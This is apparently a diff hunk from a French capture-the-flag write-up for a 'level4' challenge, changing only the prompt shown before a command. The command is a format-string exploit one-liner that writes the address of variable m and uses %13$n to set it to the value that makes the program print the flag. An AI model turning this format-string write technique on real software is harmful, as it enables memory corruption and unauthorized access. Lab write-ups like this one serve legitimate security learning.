@@ -22,7 +22,7 @@ AAAAb7ff26b0 bffff734 b7fd0ff4 0 0 bffff6f8 804848d bffff4f0 200 b7fd1ac0 b7ff37
 - On voit que dans la source il faut que m soit egal a 16930116 pour que le programe execute un cat sur le flag. Grace au %13\$n nous prenons la 13e adresse (soit l'adresse de la variable m que nous devons override).
 
 <pre>
-python -c "print ('AAAA' + '\x10\x98\x04\x08' + '%16930108d'+ '%13\$n')" | ./level4> /tmp/output
+$> python -c "print ('AAAA' + '\x10\x98\x04\x08' + '%16930108d'+ '%13\$n')" | ./level4> /tmp/output
 </pre>
 
 - Il suffit alors d'ouvrir le `/tmp/output` avec vim pour voir le flag. (attention au cat ^^).
